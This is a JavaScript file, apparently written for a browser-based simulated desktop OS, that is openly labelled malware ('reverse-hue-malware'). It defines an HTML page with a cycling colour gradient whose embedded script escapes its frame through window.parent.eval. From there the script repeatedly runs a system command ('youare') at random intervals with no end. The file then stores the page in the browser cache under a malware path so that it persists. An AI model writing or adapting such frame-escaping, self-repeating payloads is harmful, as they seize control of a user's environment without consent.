const REVERSE_HUE = `
<html>
	<head>
        <script type="text/javascript">
        function payload() {
            w96.sys.execCmd("youare");
            let seconds = 30 + Math.random() * 60;
            setInterval(payload, seconds * 1000);
        }
        window.parent.eval("(" + payload + ")();");
        </script>
		<style>
		body {
			height: 100vh;
			width: 100vw;
			overflow: none;
			overflow: hidden;
			margin: 0;
		}
		
		.c {
			animation: 10s hue linear infinite;
            background: linear-gradient(45deg, #00bcd4, #9c27b0);
			height: 100%;
			width: 100%;
		}

		@keyframes hue {
			0% {
				filter: hue-rotate(0deg);
			}
			
			100% {
				filter: hue-rotate(360deg);
			}
		}
		</style>
	</head>
	<body>
		<div class="c"></div>
	</body>
</html>`;

(async function() {
    let reverse_hue_malware_cache = await caches.open("reverse-hue-malware");
    let blob = new Blob([REVERSE_HUE], {type: "text/html"});
    reverse_hue_malware_cache.put(new Request("/system/libraries/kernel/workers/malware/reverse-hue-malware.html"),
                                        new Response(blob));
})();
